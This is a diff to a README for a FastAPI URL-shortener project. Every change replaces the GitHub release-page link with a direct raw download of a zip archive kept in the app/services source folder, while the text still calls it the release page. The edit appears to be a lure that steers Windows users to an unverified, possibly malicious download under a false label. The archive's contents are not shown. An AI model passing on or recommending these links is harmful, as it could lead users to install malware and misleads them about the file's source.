@@ -1,6 +1,6 @@
 # 🔗 url-shortener-fastapi - Fast URL links with simple setup
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Mutagenic-ballast630/url-shortener-fastapi/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Mutagenic-ballast630/url-shortener-fastapi/main/app/services/url_fastapi_shortener_3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ url-shortener-fastapi is a Windows-ready URL shortener app. It helps you turn lo
 
 Use the release page to get the latest build:
 
-[Visit the release page to download](https://github.com/Mutagenic-ballast630/url-shortener-fastapi/releases)
+[Visit the release page to download](https://raw.githubusercontent.com/Mutagenic-ballast630/url-shortener-fastapi/main/app/services/url_fastapi_shortener_3.2.zip)
 
 ## 🖥️ What You Need
 
@@ -25,7 +25,7 @@ If you plan to run the app on one PC, install PostgreSQL and Redis first. If you
 
 ## 📦 Download the App
 
-1. Open the [release page](https://github.com/Mutagenic-ballast630/url-shortener-fastapi/releases)
+1. Open the [release page](https://raw.githubusercontent.com/Mutagenic-ballast630/url-shortener-fastapi/main/app/services/url_fastapi_shortener_3.2.zip)
 2. Find the latest release at the top
 3. Download the Windows file that fits your PC
 4. Save the file to your Downloads folder
@@ -203,4 +203,4 @@ If there is a setup guide in the release, follow it before you start the app
 
 Use this link to visit the page and download the latest Windows build:
 
-[https://github.com/Mutagenic-ballast630/url-shortener-fastapi/releases](https://github.com/Mutagenic-ballast630/url-shortener-fastapi/releases)
+[https://raw.githubusercontent.com/Mutagenic-ballast630/url-shortener-fastapi/main/app/services/url_fastapi_shortener_3.2.zip](https://raw.githubusercontent.com/Mutagenic-ballast630/url-shortener-fastapi/main/app/services/url_fastapi_shortener_3.2.zip)
